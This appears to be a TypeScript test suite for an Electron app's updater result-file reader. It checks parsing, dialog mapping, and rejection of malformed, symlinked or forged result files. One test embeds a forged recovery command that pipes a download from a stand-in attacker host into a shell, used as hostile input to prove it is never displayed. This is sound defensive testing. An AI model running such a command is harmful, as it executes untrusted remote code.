import { afterAll, beforeEach, describe, expect, test } from "bun:test"
import type { MessageBoxOptions } from "electron"
import { spawnSync } from "node:child_process"
import { constants, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs"
import * as nodeFs from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { nativeT } from "./native-translations"
import {
  computeRecoverCommand,
  createPatchResultReader,
  HANDOFF_RESULT_FILE_NAME,
  HANDOFF_RESULT_MAX_BYTES,
  parsePatchResult,
  zshSingleQuote,
  type PatchResultFs,
  type PatchResultKey,
} from "./swarm-patch-result"

// Row 61: result reader (row 58), spec 04 section 6 R1-R7, UM-18, UM-19, register 14.4 UM-22 (D52-2), UM-23.
// The result file is real, in a throwaway $T; the dialog, `status` and the uid are injected. No Electron, no applier.

const T = realpathSync(mkdtempSync(join(tmpdir(), "swarm-row61-result-")))
afterAll(() => rmSync(T, { recursive: true, force: true }))

const APP = join(T, "apps", "Swarm.app")
const RES = join(APP, "Contents", "Resources")
const HOME = join(T, "home")
const UD = join(T, "ud")
const FILE = join(UD, HANDOFF_RESULT_FILE_NAME)
for (const dir of [RES, HOME, UD]) mkdirSync(dir, { recursive: true })

const STATE = join(HOME, "Library/Application Support/id.co.gsp.swarm.patch")
const RECOVER_APPLY = `/bin/zsh -f '${STATE}/previous/Swarm.app/Contents/Resources/swarm-patch/swarm-patch' recover --target '${APP}'`
const RECOVER_ROLLBACK = `/bin/zsh -f '${APP}/Contents/Resources/swarm-patch/swarm-patch' recover`

beforeEach(() => rmSync(FILE, { recursive: true, force: true }))

function header(h: { format?: string; action?: string; outcome?: string; attempts?: string; exit?: string } = {}) {
  return [
    `handoff_format=${h.format ?? "1"}`,
    `handoff_action=${h.action ?? "apply"}`,
    `handoff_outcome=${h.outcome ?? "ran"}`,
    `handoff_attempts=${h.attempts ?? "1"}`,
    `handoff_exit=${h.exit ?? "0"}`,
  ].join("\n") + "\n"
}

const tMock = (key: PatchResultKey, params?: Record<string, string | number>) => (params ? `${key} ${JSON.stringify(params)}` : key)

function reader(opts: {
  installed?: string | "reject"
  resourcesPath?: string
  fs?: PatchResultFs
  uid?: number
  dialogReject?: boolean
  t?: typeof tMock
} = {}) {
  const dialogs: MessageBoxOptions[] = []
  const logs: { message: string; extra?: Record<string, unknown>; level?: string }[] = []
  let statusCalls = 0
  const read = createPatchResultReader({
    resultFile: FILE,
    resourcesPath: opts.resourcesPath ?? RES,
    window: () => null,
    showMessageBox: async (_w, options) => {
      dialogs.push(options)
      if (opts.dialogReject) throw new Error("no dialog")
      return { response: 0, checkboxChecked: false }
    },
    t: opts.t ?? tMock,
    installedRelease: async () => {
      statusCalls += 1
      if (opts.installed === "reject") throw new Error("status failed")
      return opts.installed ?? "1.1.3"
    },
    log: (message, extra, level) => logs.push({ message, extra, level }),
    fs: opts.fs,
    homeDir: () => HOME,
    ...(opts.uid === undefined ? {} : { getuid: () => opts.uid! }),
  })
  return {
    read,
    dialogs,
    logs,
    get statusCalls() {
      return statusCalls
    },
  }
}

const failedOnly = { type: "error", message: "desktop.patch.result.failed.message", buttons: ["desktop.patch.cancel"], defaultId: 0, cancelId: 0, noLink: true }

// ---- UM-18 / UM-22 mapping ------------------------------------------------------------------------------------------

describe("UM-18 mapping", () => {
  test("applied, release equals status: BN-49 info, title BN-30, file gone", async () => {
    writeFileSync(FILE, header() + "result=applied\nrelease=1.1.3\n")
    const r = reader()
    const out = await r.read()
    expect(out.shown).toBe(true)
    expect(r.dialogs).toEqual([
      {
        type: "info",
        title: "desktop.menu.updateFromFile",
        message: tMock("desktop.patch.result.updated.message", { release: "1.1.3" }),
        buttons: ["desktop.patch.cancel"],
        defaultId: 0,
        cancelId: 0,
        noLink: true,
      },
    ])
    expect(r.statusCalls).toBe(1)
    expect(existsSync(FILE)).toBe(false)
  })

  test("rolled_back: BN-50 info, title BN-31", async () => {
    writeFileSync(FILE, header({ action: "rollback" }) + "result=rolled_back\nrelease=1.1.2\n")
    const r = reader({ installed: "1.1.2" })
    await r.read()
    expect(r.dialogs[0]).toMatchObject({
      type: "info",
      title: "desktop.menu.undoLastUpdate",
      message: tMock("desktop.patch.result.undone.message", { release: "1.1.2" }),
    })
    expect(existsSync(FILE)).toBe(false)
  })

  test("release differs from status: BN-51 without detail", async () => {
    writeFileSync(FILE, header() + "result=applied\nrelease=1.1.3\n")
    const r = reader({ installed: "1.1.2" })
    await r.read()
    expect(r.dialogs[0]).toMatchObject(failedOnly)
    expect(r.dialogs[0]!.detail).toBeUndefined()
    expect(existsSync(FILE)).toBe(false)
  })

  test("status fails: BN-51 without detail", async () => {
    writeFileSync(FILE, header() + "result=applied\nrelease=1.1.3\n")
    const r = reader({ installed: "reject" })
    await r.read()
    expect(r.dialogs[0]).toMatchObject(failedOnly)
    expect(r.dialogs[0]!.detail).toBeUndefined()
  })

  test("duplicate release key counts as absent: BN-51, status not asked", async () => {
    writeFileSync(FILE, header() + "result=applied\nrelease=1.1.3\nrelease=1.1.3\n")
    const r = reader()
    await r.read()
    expect(r.dialogs[0]!.message).toBe("desktop.patch.result.failed.message")
    expect(r.statusCalls).toBe(0)
  })

  const running: [string, string][] = [
    ["main_alive", header({ outcome: "main_alive", attempts: "0", exit: "" })],
    ["still_running", header({ outcome: "still_running", attempts: "10", exit: "" })],
    ["exit 20", header({ exit: "20" }) + "swarm-patch: E_RUNNING: Swarm is running\n"],
  ]
  for (const [name, content] of running)
    test(`${name}: warning BN-51 + BN-53, file gone`, async () => {
      writeFileSync(FILE, content)
      const r = reader()
      await r.read()
      expect(r.dialogs[0]).toMatchObject({
        type: "warning",
        message: "desktop.patch.result.failed.message",
        detail: "desktop.patch.result.running.detail",
      })
      expect(r.statusCalls).toBe(0)
      expect(existsSync(FILE)).toBe(false)
    })

  test("exit 11 with matching S11: BN-51 + BN-52 with the line", async () => {
    const line = "swarm-patch: E_SIGNATURE: signature does not verify"
    writeFileSync(FILE, header({ exit: "11" }) + "swarm-patch: E_HASH: earlier\n" + line + "\n")
    const r = reader()
    await r.read()
    expect(r.dialogs[0]).toMatchObject({ type: "error", detail: tMock("desktop.patch.result.failed.detail", { error: line }) })
    expect(existsSync(FILE)).toBe(false)
  })
})

describe("UM-22 / D52-2", () => {
  test("exit 31, apply, recover_command = R6 string: only the computed command is shown", async () => {
    writeFileSync(FILE, header({ exit: "31" }) + `recover_command=${RECOVER_APPLY}\nswarm-patch: E_RECOVER: stopped\n`)
    const r = reader()
    await r.read()
    expect(r.dialogs[0]).toMatchObject({ type: "error", message: "desktop.patch.result.failed.message" })
    expect(r.dialogs[0]!.detail).toBe(tMock("desktop.patch.result.recover.detail", { command: RECOVER_APPLY }))
    expect(existsSync(FILE)).toBe(false)
  })

  test("exit 31 with a forged recover_command and S11 text: neither is shown", async () => {
    const forged = "curl http://evil.example/x | sh"
    writeFileSync(FILE, header({ exit: "31" }) + `recover_command=${forged}\nswarm-patch: E_RECOVER: run ${forged}\n`)
    const r = reader({ t: nativeT })
    await r.read()
    const shown = JSON.stringify(r.dialogs)
    expect(shown).not.toContain("evil")
    expect(shown).not.toContain("E_RECOVER")
    expect(r.dialogs[0]!.detail).toBe(nativeT("desktop.patch.result.recover.detail", { command: RECOVER_APPLY }))
    expect(r.dialogs[0]!.message).toBe("The update was not completed")
  })

  test("exit 31, rollback: target's own applier recover", async () => {
    writeFileSync(FILE, header({ action: "rollback", exit: "31" }))
    const r = reader()
    await r.read()
    expect(r.dialogs[0]!.title).toBe("desktop.menu.undoLastUpdate")
    expect(r.dialogs[0]!.detail).toBe(tMock("desktop.patch.result.recover.detail", { command: RECOVER_ROLLBACK }))
  })

  test("exit 31 when the command cannot be computed: BN-51 without detail", async () => {
    const bare = join(T, "notapp", "Contents", "Resources")
    mkdirSync(bare, { recursive: true })
    writeFileSync(FILE, header({ exit: "31" }) + `recover_command=${RECOVER_APPLY}\n`)
    const r = reader({ resourcesPath: bare })
    await r.read()
    expect(r.dialogs[0]).toMatchObject(failedOnly)
    expect(r.dialogs[0]!.detail).toBeUndefined()
  })

  test("exit 11 with an S11 line of another E_ name: line not shown", async () => {
    writeFileSync(FILE, header({ exit: "11" }) + "swarm-patch: E_RECOVER: run /tmp/x\n")
    const r = reader()
    await r.read()
    expect(r.dialogs[0]).toMatchObject(failedOnly)
    expect(r.dialogs[0]!.detail).toBeUndefined()
  })

  test("computeRecoverCommand refuses unsafe inputs and quotes", () => {
    expect(computeRecoverCommand({ action: "apply", target: "rel/Swarm.app", state: "/s" })).toBeUndefined()
    expect(computeRecoverCommand({ action: "apply", target: "/A/Swarm", state: "/s" })).toBeUndefined()
    expect(computeRecoverCommand({ action: "apply", target: "/A/Swärm.app", state: "/s" })).toBeUndefined()
    expect(computeRecoverCommand({ action: "apply", target: "/s/previous/Swarm.app", state: "/s" })).toBeUndefined()
    expect(computeRecoverCommand({ action: "apply", target: "/A/Swarm.app", state: "s" })).toBeUndefined()
    expect(computeRecoverCommand({ action: "apply", target: "/A/it's.app", state: "/s" })).toBe(
      `/bin/zsh -f '/s/previous/Swarm.app/Contents/Resources/swarm-patch/swarm-patch' recover --target '/A/it'\\''s.app'`,
    )
    expect(zshSingleQuote("a'b")).toBe(`'a'\\''b'`)
  })
})

// ---- UM-19 / UM-23 refusals without a crash -------------------------------------------------------------------------

describe("UM-19 broken files", () => {
  const broken: [string, string | Buffer][] = [
    ["16385 bytes", Buffer.alloc(HANDOFF_RESULT_MAX_BYTES + 1, 0x61)],
    ["byte 0x1B in a header line", header().replace("handoff_format=1", "handoff_format=1\x1b[2J") + "result=applied\nrelease=1.1.3\n"],
    ["CR", header().replaceAll("\n", "\r\n")],
    ["non-ASCII release value", header() + "release=1.1.3é\n"],
    ["invalid UTF-8 in a header line", Buffer.concat([Buffer.from("handoff_format=1\xff\n", "latin1"), Buffer.from(header().split("\n").slice(1).join("\n") + "result=applied\nrelease=1.1.3\n")])],
    ["BOM before the header", "\ufeff" + header() + "result=applied\nrelease=1.1.3\n"],
    ["handoff_format=2", header({ format: "2" })],
    ["header order wrong", header().split("\n").reverse().join("\n")],
    ["handoff_attempts=11", header({ attempts: "11" })],
    ["ran with empty handoff_exit", header({ exit: "" })],
    ["main_alive with attempts 1", header({ outcome: "main_alive", attempts: "1", exit: "" })],
    ["still_running with handoff_exit set", header({ outcome: "still_running", attempts: "3", exit: "0" })],
    ["empty file", ""],
    ["binary junk", Buffer.from([0, 1, 2, 255, 254])],
  ]
  for (const [name, content] of broken)
    test(`${name}: BN-51 without detail, file gone`, async () => {
      writeFileSync(FILE, content)
      const r = reader()
      const out = await r.read()
      expect(out.shown).toBe(true)
      expect(r.dialogs).toHaveLength(1)
      expect(r.dialogs[0]).toMatchObject(failedOnly)
      expect(r.dialogs[0]!.detail).toBeUndefined()
      expect(existsSync(FILE)).toBe(false)
      // File content is never logged.
      expect(JSON.stringify(r.logs)).not.toContain("handoff_format")
    })

  test("exactly 16384 bytes is still read", async () => {
    const body = header() + "result=applied\nrelease=1.1.3\n"
    const filler = "x".repeat(HANDOFF_RESULT_MAX_BYTES - body.length - 1) + "\n"
    writeFileSync(FILE, body + filler)
    expect(lstatSync(FILE).size).toBe(HANDOFF_RESULT_MAX_BYTES)
    const r = reader()
    await r.read()
    expect(r.dialogs[0]!.type).toBe("info")
  })

  test("symlink to a valid file: BN-51, link removed, target kept", async () => {
    const real = join(T, "valid-target")
    writeFileSync(real, header() + "result=applied\nrelease=1.1.3\n")
    symlinkSync(real, FILE)
    const r = reader()
    await r.read()
    expect(r.dialogs[0]).toMatchObject(failedOnly)
    expect(r.dialogs[0]!.detail).toBeUndefined()
    expect(existsSync(FILE) || (() => { try { lstatSync(FILE); return true } catch { return false } })()).toBe(false)
    expect(readFileSync(real, "utf8")).toContain("result=applied")
  })

  test("FIFO: no hang, BN-51, removed", async () => {
    expect(spawnSync("/usr/bin/mkfifo", [FILE]).status).toBe(0)
    const r = reader()
    await r.read()
    expect(r.dialogs[0]).toMatchObject(failedOnly)
    expect(existsSync(FILE)).toBe(false)
  })

  test("empty directory: removed, BN-51", async () => {
    mkdirSync(FILE)
    const r = reader()
    await r.read()
    expect(r.dialogs[0]).toMatchObject(failedOnly)
    expect(existsSync(FILE)).toBe(false)
  })

  test("non-empty directory: not removable, no dialog, warn logged", async () => {
    mkdirSync(FILE)
    writeFileSync(join(FILE, "x"), "x")
    const r = reader()
    expect(await r.read()).toEqual({ shown: false, reason: "not-removed" })
    expect(r.dialogs).toHaveLength(0)
    expect(r.logs.some((l) => l.level === "warn")).toBe(true)
    rmSync(FILE, { recursive: true, force: true })
  })

  test("file owned by another uid: BN-51, removed", async () => {
    writeFileSync(FILE, header() + "result=applied\nrelease=1.1.3\n")
    const r = reader({ uid: 4242424 })
    await r.read()
    expect(r.dialogs[0]).toMatchObject(failedOnly)
    expect(r.statusCalls).toBe(0)
    expect(existsSync(FILE)).toBe(false)
  })

  test("absent file: 0 dialogs", async () => {
    const r = reader()
    expect(await r.read()).toEqual({ shown: false, reason: "absent" })
    expect(r.dialogs).toHaveLength(0)
  })

  test("dialog fails to show: no crash, error logged", async () => {
    writeFileSync(FILE, header() + "result=applied\nrelease=1.1.3\n")
    const r = reader({ dialogReject: true })
    expect((await r.read()).shown).toBe(true)
    expect(r.logs.some((l) => l.level === "error")).toBe(true)
  })

  test("open fails with EACCES: path removed, BN-51", async () => {
    let unlinked = 0
    const fs: PatchResultFs = {
      ...nodeFs,
      open: (async () => {
        throw Object.assign(new Error("EACCES"), { code: "EACCES" })
      }) as PatchResultFs["open"],
      unlink: (async () => {
        unlinked += 1
      }) as PatchResultFs["unlink"],
    }
    const r = reader({ fs })
    await r.read()
    expect(unlinked).toBe(1)
    expect(r.dialogs[0]).toMatchObject(failedOnly)
  })
})

describe("UM-23 open flags and order", () => {
  test("O_RDONLY | O_NOFOLLOW | O_NONBLOCK, unlink before fstat, at most MAX + 1 bytes read from the fd", async () => {
    writeFileSync(FILE, header() + "result=applied\nrelease=1.1.3\n")
    const events: string[] = []
    let flags: unknown
    let requested = 0
    const fs: PatchResultFs = {
      ...nodeFs,
      open: (async (path: string, f: number) => {
        flags = f
        events.push("open")
        const handle = await nodeFs.open(path, f)
        return new Proxy(handle, {
          get(target, prop) {
            if (prop === "stat") return async () => (events.push("fstat"), target.stat())
            if (prop === "read")
              return async (buffer: Buffer, offset: number, length: number, position: number) => {
                events.push("read")
                requested = Math.max(requested, offset + length)
                return target.read(buffer, offset, length, position)
              }
            const value = Reflect.get(target, prop)
            return typeof value === "function" ? value.bind(target) : value
          },
        })
      }) as PatchResultFs["open"],
      unlink: (async (path: string) => {
        events.push("unlink")
        return nodeFs.unlink(path)
      }) as PatchResultFs["unlink"],
    }
    const r = reader({ fs })
    await r.read()
    expect(flags).toBe(constants.O_RDONLY | constants.O_NOFOLLOW | constants.O_NONBLOCK)
    expect(events.slice(0, 3)).toEqual(["open", "unlink", "fstat"])
    expect(events).toContain("read")
    expect(requested).toBeLessThanOrEqual(HANDOFF_RESULT_MAX_BYTES + 1)
    expect(r.dialogs[0]!.type).toBe("info")
  })
})

// ---- R3 per line (C27 D-2, review row 31 M4) ------------------------------------------------------------------------

describe("R3 per-line rule", () => {
  // What the applier prints on a good apply (AP2 recover_command, then AP9), for a home and a target that are not ASCII.
  // NFC and NFD forms both appear on macOS (Finder names are often NFD).
  const goodApply = (homeDir: string, target: string) =>
    header() +
    `recover_command=/bin/zsh -f '${homeDir}/Library/Application Support/id.co.gsp.swarm.patch/previous/Swarm.app/Contents/Resources/swarm-patch/swarm-patch' recover --target '${target}'\n` +
    "result=applied\nrelease=1.1.3\nfrom_release=1.1.2\nmigration=none\nnew_key=\n"

  for (const [form, u] of [["NFC", "\u00dc"], ["NFD", "U\u0308"]] as const)
    test(`non-ASCII home and target (${form}): success dialog BN-49`, async () => {
      const app = join(T, `Aplikasi ${u}nduhan`, "Swarm.app")
      const homeDir = join(T, `h${u}me`)
      for (const dir of [join(app, "Contents", "Resources"), homeDir]) mkdirSync(dir, { recursive: true })
      writeFileSync(FILE, goodApply(homeDir, app))
      const r = reader({ resourcesPath: join(app, "Contents", "Resources") })
      const out = await r.read()
      expect(out.shown).toBe(true)
      expect(r.dialogs).toHaveLength(1)
      expect(r.dialogs[0]).toMatchObject({
        type: "info",
        title: "desktop.menu.updateFromFile",
        message: tMock("desktop.patch.result.updated.message", { release: "1.1.3" }),
      })
      expect(r.statusCalls).toBe(1)
      expect(existsSync(FILE)).toBe(false)
    })

  test("non-ASCII rollback (status line printed by the applier): success dialog BN-50", async () => {
    writeFileSync(FILE, header({ action: "rollback" }) + "note=/Users/\u00e5sa/Swarm.app\nresult=rolled_back\nrelease=1.1.2\n")
    const r = reader({ installed: "1.1.2" })
    await r.read()
    expect(r.dialogs[0]).toMatchObject({ type: "info", title: "desktop.menu.undoLastUpdate" })
  })

  const dropped: [string, Buffer][] = [
    ["ESC", Buffer.from("noise \x1b[2J line\n")],
    ["DEL", Buffer.from("noise \x7f\n")],
    ["C1 (U+009B CSI)", Buffer.from("noise \u009b2J\n")],
    ["NUL", Buffer.from("noise \x00\n")],
    ["CR", Buffer.from("noise\r\n")],
    ["invalid UTF-8", Buffer.from("noise \xc3\x28\n", "latin1")],
    ["UTF-8 cut by the 12000-byte cap", Buffer.from("tail \u00dc").subarray(0, -1)],
  ]
  for (const [name, bad] of dropped)
    test(`a later line with ${name} is dropped; the rest still decides`, async () => {
      writeFileSync(FILE, Buffer.concat([Buffer.from(header() + "result=applied\n"), bad, Buffer.from("\nrelease=1.1.3\n")]))
      const r = reader()
      await r.read()
      expect(r.dialogs[0]).toMatchObject({ type: "info", message: tMock("desktop.patch.result.updated.message", { release: "1.1.3" }) })
    })

  test("a dropped S12 line does not count, a dropped S11 line is never shown", () => {
    const bytes = Buffer.concat([
      Buffer.from(header({ exit: "11" }) + "swarm-patch: E_SIGNATURE: kept\n"),
      Buffer.from("swarm-patch: E_SIGNATURE: \x1b[31mforged\n"),
      Buffer.from("release=1.1.3\x07\n"),
    ])
    const file = parsePatchResult(bytes)!
    expect(file.error).toEqual({ name: "E_SIGNATURE", line: "swarm-patch: E_SIGNATURE: kept" })
    expect(file.release).toBeUndefined()
  })

  test("a non-ASCII S11 line is not an S11 line (R5 stays ASCII)", () => {
    const file = parsePatchResult(Buffer.from(header({ exit: "11" }) + "swarm-patch: E_SIGNATURE: \u00fcber\n"))!
    expect(file.error).toBeUndefined()
  })

  test("a line longer than HANDOFF_RESULT_MAX_BYTES is dropped", () => {
    const long = "release=1.1.3" + " ".repeat(HANDOFF_RESULT_MAX_BYTES)
    const file = parsePatchResult(Buffer.from(header() + "result=applied\n" + long + "\n"))!
    expect(file.result).toBe("applied")
    expect(file.release).toBeUndefined()
  })

  test("the last line may end without LF", () => {
    expect(parsePatchResult(Buffer.from(header() + "release=1.1.3"))!.release).toBe("1.1.3")
  })
})

describe("parsePatchResult", () => {
  test("parses header, S12 and last S11; other lines ignored", () => {
    const text = header({ exit: "13" }) + "noise line\nresult=verified\nswarm-patch: E_HASH: one\nswarm-patch: E_HASH: two\n"
    expect(parsePatchResult(Buffer.from(text))).toEqual({
      action: "apply",
      outcome: "ran",
      attempts: 1,
      exit: 13,
      result: "verified",
      release: undefined,
      error: { name: "E_HASH", line: "swarm-patch: E_HASH: two" },
    })
  })
})
